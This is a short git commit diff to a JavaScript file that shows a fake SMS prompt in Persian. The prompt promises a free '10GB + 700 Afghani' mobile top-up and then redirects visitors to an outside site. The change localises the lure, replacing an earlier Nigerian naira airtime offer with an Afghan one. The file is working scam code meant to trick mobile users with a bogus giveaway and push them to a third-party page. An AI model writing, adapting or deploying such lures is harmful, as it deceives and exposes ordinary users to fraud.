2c0c11799a157dc398fabe1ff9bf9e4c1ae2cbab
itidetidre-glitch <itidetidre@gmail.com>
2026-05-08 09:14:28 -0700

    Update verify-azizi.js

--- verify-azizi.js
+++ verify-azizi.js
@@ -1,5 +1,5 @@
 var password = '10GB + 700 AFN Top-up'
-password=prompt('SMS: تبریک باشه، شماره مبایل شما واجد شرایط دریافت 10GB + 700 افغانی Top up است، برای فعال کردن حالا روی OK کلیک کنید','10GB + ₦5,000 Airtime');
-if (password != '10GB + ₦5,000 Airtime') {
+password=prompt('SMS: تبریک باشه، شماره مبایل شما واجد شرایط دریافت 10GB + 700 افغانی Top up است، برای فعال کردن حالا روی OK کلیک کنید','10GB + 700 AFN Top-up');
+if (password != '10GB + 700 AFN Top-up') {
 location.href='https://mmaifot.com/azizi-bithday';
 }
